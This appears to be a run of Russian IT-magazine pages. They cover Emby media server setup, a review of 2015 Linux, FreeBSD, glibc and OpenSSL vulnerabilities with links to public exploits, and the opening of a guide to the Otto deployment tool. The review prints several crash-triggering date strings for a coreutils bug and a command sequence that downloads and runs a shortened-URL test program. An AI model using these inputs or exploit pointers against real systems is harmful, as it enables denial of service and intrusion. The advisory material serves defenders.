усмотрена поддержка личного профиля пользователя, позволяющая каждо-
му устанавливать предпочтения, наиболее удобный способ представления
медиатеки, статус воспроизведения и настраивать родительский контроль.
Установленные параметры профиля будут действительны на всех устройствах
пользователя. Реализован простой поиск. Выбрать медиафайл к воспроиз-
ведению можно несколькими способами, просто указав нужный в коллекции
или среди последних воспроизведенных, в списке очередных эпизодов, в из-
бранном, в плей-листе или отобранном ранее для просмотра. Предусмотрена
возможность передачи по домашней сети содержимого медиасервера Emby
с помощью DLNA. Это упрощает подключение, раздачу контента и управле-
ние. Если на мобильном устройстве установлено приложение Emby, можно
легко синхронизировать или передать медиафайлы на смартфон с рабоче-
го компьютера, возможна и автоматическая выгрузка отснятых видео и фото
с мобильных устройств на сервер. Поддерживается синхронизация с Dropbox,
Google Drive, One Drive и между каталогами. Управление производится при по-
мощи веб-панели.
   Возможности расширяются при помощи плагинов, причем ссылки на уста-
новку части из них разнесены по пунктам меню, отвечающим за определенные
сервисы. Из интерфейса можно получить доступ к большому количеству плаги-
нов (разбиты на три группы), позволяющих подключаться к сервисам, предла-
гающим контент (YouTube, SoundCloud...), и расширяющих настройки (создание
коллекций, обложки, бэкап, синхронизация с облачными сервисами, интерфейс
к Windows Media Center). Большая часть плагинов предлагается бесплатно.





Возможности Emby расширяются при помощи плагинов
  Сервер доступен в двух изданиях — свободном и платном (Emby premiere).
Бесплатная версия имеет все основные функции домашнего медиасервера,
отсутствуют такие возможности, как синхронизация контента на мобильных
устройствах Mobile Sync и с облаком Cloud Sync. Также не будут работать не-
которые функции в клиентах для мобильных ОС и приложениях и будет недо-
ступна часть плагинов. Написан Emby на Mono.

УСТАНОВКА EMBY
Серверная часть доступна для Linux, FreeBSD, Windows, OS X, некоторых
NAS-серверов (FreeNAS, OpenMediaVault, QNAP, Synology) и Docker. Для уста-
новки в Ubuntu необходимо подключить сторонний репозиторий. Для Ubuntu
14.04 LTS процесс прост:

$ wget -qO - http://download.opensuse.org/repositories/
    home:emby/xUbuntu_14.04/Release.key | sudo apt-key add -
$ sudo sh -c “echo ‘deb http://download.opensuse.org/repositories/
    home:/emby/xUbuntu_14.04/ /’ >> /etc/apt/sources.list.d/
    emby-server.list”
$ sudo apt-get update
$ sudo apt-get install mono-runtime mediainfo libsqlite3-dev
    imagemagick-6.q8 libmagickwand-6.q8-2 libmagickcore-6.q8-2
    emby-server links2

Консольный браузер (Links2, Links, Lynx или w3c) почему-то не указан в зависи-
мостях в инструкции на сайте. Очевидно, предполагается, что он уже установ-
лен в системе, но в некоторых дистрибутивах его нет. Он нужен обязательно,
иначе мастер настройки не будет запущен.
  При установке будут созданы сертификаты, учетная запись, от имени кото-
рой будет выполняться сервер (по умолчанию emby), домашний каталог /usr/lib/
emby-server и каталог для данных /var/lib/emby-server. Запускаем сервер Emby:

$ sudo service emby-server start

Дальше настраивать нужно через браузер при помощи Emby Web Client. Под-
ключаемся к http://localhost:8096 (сокет при первом запуске откроется не сразу)
или 8920 (HTTPS). Порт при необходимости меняется в настройках. В зависи-
мости от дистрибутива возможны разные проблемы при запуске, здесь лучше
посмотреть в журнал /var/log/emby-server.log, обычно там есть подсказка.
  В мастере настройки выбираем язык, который будет использован во время
установки. В списке есть русский, но его выбор никак не влияет, мастер про-
должает разговаривать на английском. Впрочем, это не мешает. Создадим свой
профиль. Вводим имя учетной записи для доступа к панели. Остальных поль-
зователей, если будет такая необходимость, сможем добавить позже через
веб-интерфейс. В этом же окне указываются данные для подключения к Emby
Connect — он необязателен, но его использование позволяет легко подклю-
чаться к доступным серверам, не зная их IP (что очень полезно, если провайдер
назначает его динамически). Следующий этап — добавление медиабиблиотек.
Просто нажимаем Add Media Library, отмечаем тип библиотеки (видео, музыка...)
и указываем на каталог локальный или сетевой (в формате \\192.168.1.1\video).
Причем можно ввести часть пути, затем нажать кнопку Refresh, и после скани-
рования будет показан список доступных каталогов. В каждой категории можно
добавить любое количество каталогов. Emby различает и ресурсы с названием
на кириллице. Затем Emby сканирует медиатеку и определяет файлы в соответ-
ствии со структурой папки, именем файла и назначенным типом библиотеки.
После этого загружает всю соответствующую информацию: постеры, описания,
рейтинги и прочее. Параметры загрузки настраиваем на следующем шаге.





Добавление каталогов в медиатеку

В частности, выбираем основной язык метаданных и страну. Далее будет пред-
ложено настроить Live TV; если есть ТВ-тюнер, указываем его тип и IP-адрес,
иначе просто жмем Skip. Принимаем условия лицензии. Вот и все, настройка
закончена. После нажатия на Finish подключаемся к панели управления сер-
вера. Здесь просто щелкаем по названию своего профиля. При первом захо-
де интерфейс обычно устанавливается английский, но стоит перейти по паре
пунктов, и интерфейс локализуется сам по себе (если был выбран русский).
УСТАНОВКИ В ПАНЕЛИ УПРАВЛЕНИЯ
Панель управления позволяет управлять всеми функциями сервера, работать
с коллекцией и получать доступ к контенту. Настройки можно разделить на об-
щие и индивидуальные, которые будут актуальны только для конкретного про-
филя. Для каждой доступен короткий тур, помогающий быстро разобраться
в некоторых особенностях Emby, справка позволяет перейти к странице Вики,
в которой чуть подробней расписана соответствующая функция. Чтобы понять
возможности Emby, разберем некоторые из них.





В инфопанели указываются IP для подключения

В инфопанели, которая первой встречает при входе, выведена информация
о версии сервера, а также о внутреннем и внешнем IP для подключения. При-
чем при наличии роутера внешний адрес определяется именно по его уста-
новкам. Здесь же показываются подключенные устройства и их активность,
недавние события и свежая информация от разработчиков. То есть, заглянув
сюда, можно всегда знать состояние сервера и кто чем занимается. Вверху
меню, позволяющее получить доступ к медиаданным и к уведомлениям, вы-
брать проигрыватель и настроить профиль.
  Перейдя в «Параметры», можем указать имя сервера (по умолчанию ис-
пользуется hostname), предпочитаемый язык отображения, настроить путь
к кешу и оформление. Последнее включает в себя предупреждение при входе
и привязку CSS.
  В меню «Устройства» можно найти все подключенные к серверу устройства
и камеры, с которых возможна автоматическая выгрузка фото и видео. Тюне-
ры настраиваются в меню «Эфир», там же указывается подключение к теле-
гид-сервисам вроде Schedules Direct.
   Пользователи могут быть двух типов: пользователи или гости. Причем
гость — это не локальная учетная запись, а привязка к пользовательскому ак-
каунту на Emby Connect. Для его подключения требуется просто указать имя
или email, и сразу можно отправить приглашение к подключению. Пока поль-
зователь его не примет, приглашение находится в статусе «отложенное» (при
необходимости его можно отозвать). Локальная учетная запись, имеющая
подключение к Emby Connect, также отмечается специальным значком с об-
лаком. При создании нового пользователя требуется указать имя и опреде-
лить, к каким каналам и медиатекам тот может иметь доступ. Далее в настрой-
ках учетной записи эта информация уточняется — указывается email, каналы,
возможность доступа к записи эфира, разрешение воспроизведения контен-
та, требующего перекодировки, управление DLNA-устройствами и пароль.
На отдельной вкладке указываются возрастные ограничения и блокируемый
контент. Права администратора определяются установкой параметра «Этому
пользователю разрешить управление сервером».
  Следующая группа подменю позволяет управлять медиатекой и медиадан-
ными. В меню «Медиатека» можно добавить еще ссылки на ресурсы, вручную
пересканировать содержимое папок (обычно по расписанию), открыть прямой
сетевой доступ к определенным каталогам. Emby умеет доставать медиакон-
тент из ZIP- и RAR-архивов, но по умолчанию такие файлы в каталогах пропу-
скаются и не сканируются. Активировать эту функцию можно, перейдя в «Рас-
ширенное».
  В меню «Метаданные» настраивается загрузка обложек, данных о фильмах
и субтитров из интернета, место хранения информации, приоритет ресурсов
и поддержка NFO-файлов. По умолчанию из интернета загружается основной
рисунок и логотип, но можно разрешить загрузку баннера и диска. Также можно
включить загрузку биографий, извлечение рисунков сцен. Субтитры по умол-
чанию загружаются с OpenSubtitles. Для доступа потребуется указать учетную
запись. Также здесь прописываем, если имеется, индивидуальный API-ключ
сайта Fanart.tv, на котором собраны неофициальные медиаматериалы к ТВ,
музыке и фильмам.
  Многие функции Emby требуют серьезных ресурсов, в первую очередь CPU
и пропускной способности сети. Некоторые ограничения по максимальной
скорости трансляции в интернет и параметрам перекодировки можно указать
в меню «Воспроизведение». Здесь же настраивается режим кинотеатра.
  Меню «Автопорядок» позволяет настроить автоматическую сортировку
медиафайлов из общей папки. Необходимо задать каталог (сетевой или ло-
кальный) и шаблон имени. Также можно автоматически удалять файлы с опре-
деленными расширениями.
  Сообщения об основных событиях (системных и относящихся к плагинам)
выводятся внизу окна. В меню «События» можно настроить остальное опо-
вещение, в частности о некоторых действиях пользователей и добавлении
контента. Все включать обычно нет смысла, так как даже при относительно
небольшой активности сообщений будет много. Подключением плагинов на-
страивается оповещение администратора на Android, email и через сервисы
вроде Prowl, Pushover или Pushalot.





Выбор категории и меню

Меню «Расширенное» скрывает две основные возможности: автоматическое
обновление и номера портов для подключения. Здесь же можно указать свой
сертификат, вместо используемого по умолчанию самоподписанного.
  Все основные операции (обновление Emby и плагинов, сканирование кол-
лекции, закачка медиаданных, синхронизация, конвертирование и прочие)
выполняются автоматически при помощи заданий, которые настраиваются
в меню «Планировщик». Сами операции предустановлены, и изменить или до-
бавить через интерфейс нельзя, но можно удалить старый или назначить но-
вый триггер для его запуска.





Меню воспроизведения видео

ИНДИВИДУАЛЬНЫЕ НАСТРОЙКИ
Настройка профиля вызывается по щелчку на изображении человечка в верх-
нем меню, затем выбираем «Параметры». Здесь четыре пункта:
•  параметры отображения — навигация и отображение элементов (показ от-
   сутствующих и ожидаемых эпизодов, отображение коллекции);
•  параметры главного экрана — настройка главной страницы (выбор инфор-
   мации, которая будет отображаться в разделах), автоматическое группи-
   рование, стилизация и порядок медиапапок;
•  параметры воспроизведения — языковые настройки (следует выбрать
   предпочитаемый язык звуковой дорожки, режим субтитров), здесь же можно
   установить максимальную скорость потоковой трансляции (по умолчанию
   регулируется автоматически), возможность воспроизведения на внешних
   проигрывателях;
•  профиль — изменение аватара и пароля.
Как видишь, установки позволяют полностью настроить предпочтения.
Из коробки функция воспроизведения на внешнем проигрывателе работа-
ет в Android и iOS, в остальных ОС придется немного повозиться с установ-
ками браузера и проигрывателя. В качестве внешнего проигрывателя ви-
део по умолчанию используется VLC, но в Windows его с успехом заменяет
MPC-HC.
  Все операции производятся из контекстного меню. Например, при воспро-
изведении аудиоколлекции можно выбрать перемешивание дорожек, сфор-
мировать плей-лист и очередь, изменить постер и многое другое. Зеленые
кружочки на обложке указывают на количество невоспроизведенных элемен-
тов. Если задержать курсор над постером, будет показана подробная инфор-
мация (рейтинг, время воспроизведения, описание и прочее). Если выбрать
кнопку «Править», то будет вызван диспетчер метаданных, где можно изме-
нить некоторую информацию.





Подключение сервера в Emby Connect

ПОДКЛЮЧАЕМСЯ К EMBY CONNECT
Emby Connect дает большую свободу действий, поэтому не использовать та-
кую возможность нельзя, тем более что денег за это не требуют. Для создания
учетной записи потребуется Twitter-аккаунт или действующий email и пароль.
Интерфейс Emby Connect не локализован, но каких-то трудностей с его ис-
пользованием нет. После входа следует перейти в свою комнату (https://app.
emby.media) и добавить сервер. Если учетные данные Emby Connect были ука-
заны при работе мастера установки или в настройках пользователя, в Invitations
должен быть виден запрос на подключение, просто щелкаем в правом углу
по многоточию и выбираем Accept (или Reject, если он не нужен). Сервер мож-
но задать вручную, нажав Add Server и указав его IP и порт для подключения.
В дальнейшем подключиться к нужному серверу можно, просто щелкнув по яр-
лыку в окне Emby Connect. Дальше можно выбирать медиа, воспроизводить,
ставить оценку, добавлять в избранное, коллекцию или плей-лист, редактиро-
вать, расшаривать и синхронизировать (для платной версии). Здесь же можно
создавать свои коллекции. Например, если выбрать Share, будет сгенериро-
вана ссылка, которую можно одним нажатием разместить в соцсетях.
  Выбрав ссылку в левом верхнем углу, можно вызвать боковое меню, из ко-
торого быстро перейти к нужной коллекции, отредактировать метаданные,
настроить профиль, просмотреть отчеты. Отсюда можно вызвать панель на-
стройки сервера.

ЗАКЛЮЧЕНИЕ
Emby не похож на большинство решений, предназначенных для организации
медиацентра в Linux (Freevo, Kodi/XBMC, MythTV). Он позволяет не просто ор-
ганизовать медиатеку, а прозрачно обеспечить выдачу на любое устройство,
синхронизацию данных и подключаться к нескольким серверам. Возможно-
стей бесплатной версии вполне хватает для большинства ситуаций.
UNIXOID
ПТИЧЬЯ
БОЛЕЗНЬОБЗОР УЯЗВИМОСТЕЙ
В *NIX ЗА 2015 ГОД





       Мартин
    «urban.prankster»
      Пранкевич
     martin@synack.ru
По данным cvedetails.com, с 1999 года в ядре Linux найдено
1305 уязвимостей, из которых 68 — в 2015-м. Большинство
из них не несут особых проблем, помечены как Local и Low,
а некоторые можно вызвать только с привязкой к определен-
ным приложениям или настройкам ОС. В принципе, цифры
небольшие, но ядро — это не вся ОС. Уязвимости находят
и в GNU Coreutils, Binutils, glibs и, конечно же, в пользователь-
ских приложениях. Разберем самые интересные.

УЯЗВИМОСТИ В ЯДРЕ LINUX

ОС: Linux
Уровень: Medium, Low
Вектор: Remote
CVE: CVE-2015-3331, CVE-2015-4001, CVE-2015-4002, CVE-2015-4003
Exploit: концепт, https://lkml.org/lkml/2015/5/13/740, https://lkml.org/lkml/2015/5/13/744
Уязвимость, найденная в июне в ядре Linux до 3.19.3, в функции __driver_
rfc4106_decrypt в файле arch/x86/crypto/aesni-intel_glue.c связана с тем,
что реализация RFC4106 для процессоров x86, поддерживающих расшире-
ние системы команд AES AES-NI (предложена Intel, Intel Advanced Encryption
Standard Instructions), в некоторых случаях неправильно вычисляет адреса бу-
феров. Если IPsec-туннель настроен на использование этого режима (алго-
ритм AES — CONFIG_CRYPTO_AES_NI_INTEL), уязвимость может приводить
к повреждению содержимого памяти, аварийным остановкам и потенциально
к удаленному выполнению кода CryptoAPI. Причем самое интересное, что про-
блема может возникнуть сама по себе, на вполне легальном трафике, без вме-
шательства извне. На момент публикации проблема была устранена.
  В драйвере Linux 4.0.5 ozwpan, имеющем статус экспериментального, вы-
явлено пять уязвимостей, четыре из них позволяют организовать DoS-атаку
через крах ядра, отправив специально оформленные пакеты. Проблема свя-
зана с выходом за границы буфера из-за некорректной обработки знаковых
целых чисел, при котором вычисление в memcpy между required_size и offset
возвращало отрицательное число, в итоге данные копируются в кучу. Находит-
ся в функции oz_hcd_get_desc_cnf в drivers/staging/ozwpan/ozhcd.c и в функци-
ях oz_usb_rx и oz_usb_handle_ep_data файла drivers/staging/ozwpan/ozusbsvc1.c.
В других уязвимостях возникала ситуация возможного деления на 0, зацикли-
вания системы или возможность чтения из областей вне границ выделенного
буфера.
   Драйвер ozwpan, одна из новинок Linux, может быть сопряжен с существу-
ющими беспроводными устройствами, совместимыми с технологией Ozmo
Devices (Wi-Fi  Direct). Предоставляет реализацию хост-контроллера USB,
но фишка в том, что вместо физического подключения периферия взаимо-
действует через Wi-Fi. Драйвер принимает сетевые пакеты c типом (ethertype)
0x892e, затем разбирает их и переводит в различную функциональность USB.
Пока используется в редких случаях, поэтому его можно отключить, выгрузив
модуль ozwpan.ko.





                                                 Статистика уязвимостей в ядре Linux

LINUX UBUNTU

ОС: Linux Ubuntu 12.04–15.04 (ядро до 15 июня 2015 года)
Уровень: Critical
Вектор: Local
CVE: CVE-2015-1328
Exploit: https://www.exploit-db.com/exploits/37292/
Критическая уязвимость в файловой системе OverlayFS позволяет получить
права root в системах Ubuntu, в которых разрешено монтирование разде-
лов OverlayFS непривилегированным пользователем. Настройки по умолча-
нию, необходимые для эксплуатации уязвимости, используются во всех вет-
ках Ubuntu 12.04–15.04. Сама OverlayFS появилась в ядре Linux относительно
недавно — начиная с 3.18-rc2 (2014 год), это разработка SUSE для замены
UnionFS и AUFS. OverlayFS позволяет создать виртуальную многослойную
файловую систему, объединяющую несколько частей других файловых систем.
ФС создается из нижнего и верхнего слоев, каждый из которых прикрепляет-
ся к отдельным каталогам. Нижний слой используется только для чтения в ка-
талогах любых поддерживаемых в Linux ФС, включая сетевые. Верхний слой
обычно доступен на запись и перекрывает данные нижнего слоя, если фай-
лы дублируются. Востребована в Live-дистрибутивах, системах контейнерной
виртуализации и для организации работы контейнеров некоторых настольных
приложений. Пространства имен для пользователей (user namespaces) позво-
ляют создавать в контейнерах свои наборы идентификаторов пользователей
и групп. Уязвимость вызвана некорректной проверкой прав доступа при соз-
дании новых файлов в каталоге нижележащей ФС. Если ядро собрано с па-
раметром CONFIG_USER_NS=y (включение пользовательского пространства
имен), а при монтировании указан флаг FS_USERNS_MOUNT, OverlayFS мо-
жет быть смонтирована обычным пользователем в другом пространстве имен,
в том числе там, где допускаются операции с правами root. При этом операции
с файлами с правами root, выполненные в таком namespaces, получают те же
привилегии и при выполнении действий с нижележащей ФС. Поэтому можно
смонтировать любой раздел ФС и просмотреть или модифицировать любой
файл или каталог.
  На момент публикации уже было доступно обновление ядра с исправлен-
ным модулем OverlayFS от Ubuntu. И если система обновлена, проблем быть
не должно. В том же случае, когда обновление невозможно, в качестве вре-
менной меры следует отказаться от использования OverlayFS, удалив модуль
overlayfs.ko.

УЯЗВИМОСТИ В ОСНОВНЫХ ПРИЛОЖЕНИЯХ

ОС: Linux
Уровень: Critical
Вектор: локальная, удаленная
CVE: CVE-2015-0235
Exploit: https://www.qualys.com/research/security-advisories/exim_ghost_bof.rb
Опасная уязвимость в стандартной библиотеке GNU glibc, которая являет-
ся основной частью ОС Linux, и в некоторых версиях Oracle Communications
Applications и Oracle Pillar Axiom, обнаруженная во время аудита кода хакерами
из Qualys. Получила кодовое имя GHOST. Заключается в переполнении буфера
внутри функции __nss_hostname_digits_dots(), которую используют для полу-
чения имени узла такие функции glibc, как gethostbyname() и gethostbyname2()
(отсюда и название GetHOST). Для эксплуатации уязвимости нужно вызвать
переполнение буфера при помощи недопустимого аргумента имени хоста
приложению, выполняющему разрешение имени через DNS. То есть теоре-
тически эту уязвимость можно применить для любого приложения, использу-
ющего в той или иной мере сеть. Может быть вызвано локально и удаленно,
позволяет выполнить произвольный код. Самое интересное, что ошибка была
исправлена еще в мае 2013 года, между релизами glibc 2.17 и 2.18 был пред-
ставлен патч, но проблему не классифицировали как патч безопасности, по-
этому на нее внимания не обратили. В итоге многие дистрибутивы оказались
уязвимы. Вначале сообщалось, что самая первая уязвимая версия — 2.2 от 10
ноября 2000 года, но есть вероятность ее появления вплоть до 2.0. Среди про-
чих уязвимости были подвержены дистрибутивы RHEL/CentOS 5.x–7.x, Debian
7 и Ubuntu 12.04 LTS. В настоящее время доступны исправления. Сами хакеры
предложили утилиту, поясняющую суть уязвимости и позволяющую проверить
свою систему. В Ubuntu 12.04.4 LTS все нормально:

$ wget https://goo.gl/RuunlE
$ gcc gistfile1.c -o CVE-2015-0235
$ ./CVE-2015-0235
not vulnerable





Проверяем систему на GHOST

Практически сразу был выпущен модуль к Metasploit, позволяющий удаленно
выполнить код на x86 и x86_64 Linux с работающим почтовым сервером Exim (с
включенным параметром helo_try_verify_hosts или helo_verify_hosts). Позже по-
явились и другие реализации, например модуль Metasploit для проверки блога
на WordPress.
   Чуть позже, в 2015 году, в GNU glibc были обнаружены еще три уязвимости,
позволяющие удаленному пользователю произвести DoS-атаку или перепи-
сать ячейки памяти за пределами границы стека: CVE-2015-1472, CVE-2015-
1473, CVE-2015-1781.
ОС: Linux (GNU Coreutils)
Уровень: Low
Вектор: Local, Remote
CVE: CVE-2014-9471
Exploit: нет
GNU Сoreutils — один из основных пакетов *nix, включающий практически все
базовые утилиты (cat, ls, rm, date...). Проблема найдена в date. Ошибка в функ-
ции parse_datetime позволяет удаленному атакующему, не имеющему учет-
ной записи в системе, вызвать отказ в обслуживании и, возможно, выполнить
произвольный код, используя специально сформированную строку даты с ис-
пользованием timezone. Уязвимость выглядит так:

$ touch ‘--date=TZ=”123”345” @1’
Segmentation fault
$ date -d ‘TZ=”Europe/Moscow” “00:00 + 1 hour”’
Segmentation fault
$ date ‘--date=TZ=”123”345” @1’
*** Error in `date’: free(): invalid pointer: 0xbfc11414 ***





Уязвимость в GNU Сoreutils
Если уязвимости нет, получим сообщение о неверном формате даты. О на-
личии уязвимости отчитались практически все разработчики дистрибутивов
Linux. В настоящее время доступно обновление.





Нормальный вывод патченного GNU Сoreutils

ОС: Linux (grep 2.19–2.21)
Уровень: Low
Вектор: Local
CVE: CVE-2015-1345
Exploit: нет
В утилите grep, которая используется для поиска текста по шаблону, редко
находят уязвимости. Но эту утилиту часто вызывают другие программы, в том
числе и системные, поэтому наличие уязвимостей гораздо проблематичнее,
чем кажется на первый взгляд. Ошибка в bmexec_trans function в kwset.c мо-
жет привести к чтению неинициализированных данных из области за предела-
ми выделенного буфера или краху приложения. Этим может воспользоваться
хакер, создав специальный набор данных, подаваемых на вход приложения
при помощи grep -F. В настоящее время доступны обновления. Эксплоитов,
использующих уязвимость, или модуля к Metasploit нет.

УЯЗВИМОСТЬ В FREEBSD

ОС: FreeBSD
Уровень: Low
Вектор: Local, Remote
CVE: CVE-2014-0998, CVE-2014-8612, CVE-2014-8613
Exploit: https://www.exploit-db.com/exploits/35938/
В базе CVE за 2015 год не так уж много уязвимостей, если точнее — всего
шесть. Сразу три уязвимости были найдены в FreeBSD 8.4–10.х в конце января
2015-го исследователями из Core Exploit Writers Team. CVE-2014-0998 связана
с реализацией драйвера консоли VT (Newcons), который предоставляет не-
сколько виртуальных терминалов, включаемых параметром kern.vty=vt в /boot/
loader.conf.
   CVE-2014-8612 проявлялась при использовании протокола SCTP и вызва-
на ошибкой в коде проверки идентификатора потока SCTP, реализующего
SCTP-сокеты (локальный порт 4444). Суть в ошибке выхода за пределы па-
мяти в функции sctp_setopt() (sys/netinet/sctp_userreq.c). Это дает локальному
непривилегированному пользователю возможность записать или прочитать
16 бит данных памяти ядра и повысить свои привилегии в системе, раскрыть
конфиденциальные данные или положить систему.
   CVE-2014-8613 позволяет инициировать разыменование нулевого указа-
теля при обработке полученного извне SCTP-пакета, при установке SCTP_SS_
VALUE опции сокета SCTP. В отличие от предыдущих, CVE-2014-8613 может
быть использована для удаленного вызова краха ядра через отправку специ-
ально оформленных пакетов. В FreeBSD 10.1 защититься можно, установив
переменную net.inet.sctp.reconfig_enable в 0, тем самым запретив обработку
блоков RE_CONFIG. Или просто запретить использовать SCTP-соединения
приложениям (браузерам, почтовым клиентам и так далее). Хотя на момент пу-
бликации разработчики уже выпустили обновление.





Статистика уязвимостей в FreeBSD

УЯЗВИМОСТЬ В OPENSSL

ОС: OpenSSL
Уровень: Remote
Вектор: Local
CVE: CVE-2015-1793
Exploit: нет
В 2014 году в OpenSSL, широко используемом криптографическом пакете
для работы с SSL/TLS, была найдена критическая уязвимость Heartbleed. Ин-
цидент в свое время вызвал массовую критику качества кода, и, с одной сто-
роны, это привело к появлению альтернатив вроде LibreSSL, с другой — сами
разработчики наконец взялись за дело.
Топ вендоров по уязвимостям
   Критическая уязвимость обнаружена Адамом Лэнгли из Google и Дэвидом
Бенджамином из BoringSSL. Изменения, внесенные в OpenSSL версий 1.0.1n
и 1.0.2b, привели к тому, что OpenSSL пытается найти альтернативную цепоч-
ку верификации сертификата, если первая попытка построить цепочку под-
тверждения доверия не увенчалась успехом. Это позволяет обойти процедуру
проверки сертификата и организовать подтвержденное соединение с исполь-
зованием подставного сертификата, говоря другими словами — спокойно за-
манивать пользователя на поддельные сайты или сервер электронной почты
или реализовать любую MITM-атаку там, где используется сертификат.
   После обнаружения уязвимости разработчики 9 июля выпустили релизы
1.0.1p и 1.0.2d, в которых эта проблема устранена. В версиях 0.9.8 или 1.0.0
этой уязвимости нет

Linux.Encoder

Конец осени ознаменовался появлением целого ряда вирусов-шифровальщи-
ков, вначале Linux.Encoder.0, затем последовали модификации Linux.Encoder.1
и Linux.Encoder.2, заразивших более 2500 сайтов. По данным антивирусных ком-
паний, атаке подвергаются серверы на Linux и FreeBSD с веб-сайтами, работа-
ющими с использованием различных CMS — WordPress, Magento CMS, Joomla
и других. Хакеры используют неустановленную уязвимость. Далее размещался
шелл-скрипт (файл error.php), при помощи которого и выполнялись любые даль-
нейшие действия (через браузер). В частности, запускался троян-энкодер Linux.
Encoder, который определял архитектуру ОС и запускал шифровальщик. Энко-
дер запускался с правами веб-сервера (Ubuntu — www-data), чего вполне доста-
точно, чтобы зашифровать файлы в каталоге, в котором хранятся файлы и ком-
поненты CMS. Зашифрованные файлы получают новое расширение .encrypted.
Также шифровальщик пытается обойти и другие каталоги ОС, если права на-
строены неправильно, то он вполне мог выйти за границы веб-сайта. Далее в ка-
талоге сохранялся файл README_FOR_DECRYPT.txt, содержащий инструкции
по расшифровке файлов и требования хакера. На данный момент антивирусные
компании представили утилиты, позволяющие расшифровать каталоги. Напри-
мер, набор от Bitdefender. Но нужно помнить, что все утилиты, предназначенные
для расшифровки файлов, не удаляют шелл-код и все может повториться.
   Учитывая, что многие пользователи, занимающиеся разработкой или экс-
периментирующие с администрированием веб-сайтов, часто устанавливают
веб-сервер на домашнем компьютере, следует побеспокоиться о безопасно-
сти: закрыть доступ извне, обновить ПО, эксперименты устраивать на VM. Да
и сама идея может в будущем использоваться при атаке на домашние системы.
ВЫВОД
Сложного ПО без ошибок физически не существует, поэтому придется мирить-
ся с тем фактом, что уязвимости будут обнаруживаться постоянно. Но не все
они могут представлять действительно проблемы. И можно себя обезопасить,
предприняв простые шаги: удалить неиспользуемое ПО, отслеживать новые
уязвимости и обязательно устанавливать обновления безопасности, настро-
ить брандмауэр, установить антивирус. И не забывать о специальных техноло-
гиях вроде SELinux, которые вполне справляются при компрометации демона
или пользовательского приложения.
 SYNACK
ПО СЛЕДАМ
БРОДЯГИ ЗНАКОМИМСЯ
 С СИСТЕМОЙ ДЕПЛОЯ

                                                                            Евгений Зобнин ПРИЛОЖЕНИЙ OTTO                                                                                                          androidstreet.net
Деплой приложений с машины разработки на боевой сер-
вер всегда создавал множество проблем для разработчи-
ков. На машинах могут быть установлены разные версии
библиотек и зависимых сервисов, использоваться раз-
личные пути установки. Да что там говорить, не каждый
разработчик будет держать на своей машине Linux-дис-
трибутив нужной версии. Но что, если бы у нас был ин-
струмент, позволяющий быстро и легко развернуть нуж-
ную среду разработки и так же просто залить приложение
на боевой сервер?

ВМЕСТО ВВЕДЕНИЯ
С незапамятных времен для решения проблемы различий среды разработ-
ки и боевого сервера принято применять виртуальные серверы. Это действи-
тельно простой и удобный способ создать идентичное боевому серверу окру-
жение на любой платформе, будь это Linux, OS X или Windows. Все, что нужно
сделать, — это установить виртуалку, поднять в ней нужную ОС и настроить ее
идентично серверу.
  Особо продвинутые товарищи шли еще дальше и писали скрипты, позволя-
ющие частично или полностью автоматизировать этот процесс. Для автомати-
зации самой виртуальной машины применялись встроенные в них командные
интерфейсы (такие есть и в VMware, и в VirtualBox, и даже в QEMU), а для ав-
томатизации развертывания нужной среды в уже запущенной ВМ — системы
оркестрации типа Puppet или Chief. Затем появился Vagrant — готовое ПО, на-
правленное на решение именно этой задачи. Он должен быть хорошо знаком
любому, кто продвинулся дальше модели «одно приложение на одном серве-
ре» и в связи с этим столкнулся с кучей проблем. Vagrant позволяет поднять
окружение практически любой сложности и с любым количеством машин с по-
мощью пары простых команд и набора конфигурационных файлов.
  За пять лет Vagrant фактически превратился в стандарт среди данного типа
решений, а его разработчики выпустили массу сопутствующих инструментов:
Packer для создания образов виртуальных машин, Terraform для автоматиче-
ского построения целых инфраструктур в облаке, Сonsul и Serf для мониторин-
га серверов и их коммуникации и другие. Все они работали в связке с Vagrant
и фактически брали на себя работу DevOps-инженера. Однако без проблем
не обошлось. Инструменты были разобщены и использовали разные форматы
конфигов. Сам Vagrant также стал не самым простым и очевидным решением.
Для написания конфига, например, нужно было знать хотя бы азы Ruby, а так-
же синтаксис Puppet или другой системы оркестрации. Также Vagrant не особо
подходил для решения задач в эру микросервисов и оперировал целыми ма-
шинами, а не приложениями. Вопрос деплоя также не был до конца решен.
   Чтобы избавиться от этих проблем, разработчики Vagrant выкатили Otto —
единое решение, позволяющее объединить все описанные инструменты
и при этом на порядок упростить и конфигурирование окружения разработ-
ки, и его деплой на реальные серверы. Благодаря Otto такие задачи решают-
ся с помощью небольшого и понятного конфига в несколько десятков строк
и пары команд. Кроме того, этот инструмент следует тренду и ориентирован
на микросервисы (основанные на Docker, например), а также оперирует поня-
тием «приложение», а не «машина». То есть если в случае Vagrant ты описывал
в конфигах всю машину целиком (какой дистрибутив поставить, какие пакеты
и прочее), то в конфиге Otto тебе достаточно описать только свое приложение,
а все остальное Otto сделает за тебя: скачает нужный образ ОС и поставит все
необходимые зависимости. Тебе останется только зайти в созданное окруже-
ние с помощью SSH.
   Otto ориентирован на облака, поэтому деплой приложения в нем выполня-
ется с помощью заливки на удаленный сервер не самого приложения, а всего
образа ОС целиком. Другими словами, после того как ты внес все необходи-
мые правки в приложение, остается только отдать команду на сборку обра-
за под конкретную облачную платформу (поддерживаются Amazon и другие)
и команду для его заливки. К примеру, если тебе нужен веб-сервер на Amazon
с указанным PHP-приложением, то все, что нужно сделать, — это создать кон-
фиг в несколько строк и отдать несколько команд для создания окружения, по-
строения из него образа и последующей заливки образа на Amazon. В даль-
нейшем в локальное окружение можно «зайти», внести изменения и точно так
же залить обновленный образ в облако с помощью пары команд. Это действи-
тельно очень просто.

ПРОБУЕМ!
Otto легко не только использовать, но и установить. Фактически это один испол-
няемый файл (доступны версии для Linux, OS X и Windows), который достаточ-
но скачать и запустить. Единственное требование: установленный VirtualBox.
Все остальные зависимости (Vagrant и Ко) Otto скачает сам. Пример установки
Otto в среде Linux:

$ cd /tmp
$ wget https://releases.hashicorp.com/otto/0.1.2/
    otto_0.1.2_linux_amd64.zip
$ unzip otto_0.1.2_linux_amd64.zip
$ mv otto ~/bin
$ chmod +x ~/bin/otto
Вместо каталога ~/bin можно использовать и любой другой, сути это не меня-
ет. Далее просто запускаем Otto:

$ otto

На экране должен появиться простенький хелп. А дальше можно начать работу
с приложением. Для примера создадим конфигурацию окружения для запу-
ска Ruby-приложений с MySQL в отдельном Docker-контейнере. Для начала
создадим каталог проекта с подкаталогом mysql внутри:

$ mkdir -p otto-project/mysql/

Далее в подкаталоге mysql разместим файл Appfile со следующим содержи-
